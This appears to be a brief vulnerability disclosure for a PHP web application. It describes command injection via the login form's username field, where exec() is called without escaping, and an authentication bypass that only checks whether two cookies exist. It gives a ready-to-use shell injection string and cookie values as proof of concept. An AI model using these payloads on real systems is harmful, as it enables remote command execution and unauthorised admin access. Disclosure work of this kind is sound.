1. Description

Itâ€™s possible to execute arbitrary commands using login form because `exec()` function is used without `escapeshellarg()`.

It's possible to bypass login form because function only check if `$_COOKIE['username']` and `$_COOKIE['isAdmin']` exist.

2. Proof of Concept

For RCE simply use as username:

a" || your_command_to_execute || "

For authentication bypass set COOKIES:

username=1; isAdmin=1

and then visit for example php/users.php
